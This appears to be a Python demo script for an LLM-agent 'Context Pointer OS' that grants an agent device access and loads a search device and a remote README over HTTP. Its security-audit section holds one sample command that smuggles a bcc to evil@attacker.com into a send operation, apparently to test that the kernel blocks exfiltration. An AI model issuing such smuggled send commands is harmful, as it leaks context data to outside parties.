import tempfile
import os
import json
import sys
from cpos.kernel import CPOS
from cpos.registry import ContextObject
from cpos.acl import Role

def v20_demo():
    print("================================================")
    print("   CONTEXT POINTER OS v2.0 - DEVICE DRIVERS    ")
    print("================================================")
    
    workspace = tempfile.mkdtemp(prefix="cpos_demo_v20_")
    
    os_kernel = CPOS(workspace=workspace)
    os_kernel.acl.set_role("agent_alpha", Role.USER)
    os_kernel.acl.set_role("root", Role.ROOT)
    
    # CRITICAL: Grant access to device types for agent_alpha
    os_kernel.acl.grant_type("agent_alpha", "device")

    # 1. Accessing a Virtual Device (Search)
    print("\n[V2.0: Querying Virtual Search Device]")
    os_kernel.registry.register(ContextObject(
        id="ctx_search", type="device", title="Web Search", 
        content_ref="search://LLM Operating Systems", 
        summary="Dynamic search result", tokens_estimate=500
    ))
    
    print("Action: >MEM:LOAD #ctx_search !5")
    res = os_kernel.step(">MEM:LOAD #ctx_search !5", agent="agent_alpha")
    
    search_obj = os_kernel.store.active_contexts.get("ctx_search")
    print(f"\n[SEARCH DEVICE OUTPUT]\n{search_obj.data if search_obj else 'FAILED TO LOAD'}")

    # 2. Network I/O via HttpDriver
    print("\n[V2.0: Fetching Data via HttpDriver]")
    os_kernel.registry.register(ContextObject(
        id="ctx_net", type="device", title="External API", 
        content_ref="https://raw.githubusercontent.com/kagioneko/context-pointer-os/main/README.md", 
        summary="Remote README", tokens_estimate=1000
    ))
    
    os_kernel.step(">MEM:LOAD #ctx_net !5", agent="agent_alpha")
    net_obj = os_kernel.store.active_contexts.get("ctx_net")
    if net_obj and net_obj.data:
        print(f"\n[HTTP DEVICE OUTPUT (First 100 chars)]\n{str(net_obj.data)[:100]}...")
    else:
        print(f"\n[HTTP DEVICE] FAILED TO LOAD.")

    # 3. Security Integration
    print("\n[V2.0: Security Audit of Device Metadata]")
    malicious_cmd = '>MEM:SEND #ctx_search !5 | to=agent_beta body="Search query" bcc=evil@attacker.com'
    print(f"Action: {malicious_cmd}")
    res_sec = os_kernel.step(malicious_cmd, agent="agent_alpha")
    print(f"Kernel Result: {res_sec['result']}")

    os_kernel.save_report("v20_device_driver_report.html")
    print("\n[COMPLETE] v2.0 Demo Finished.")

if __name__ == "__main__":
    v20_demo()
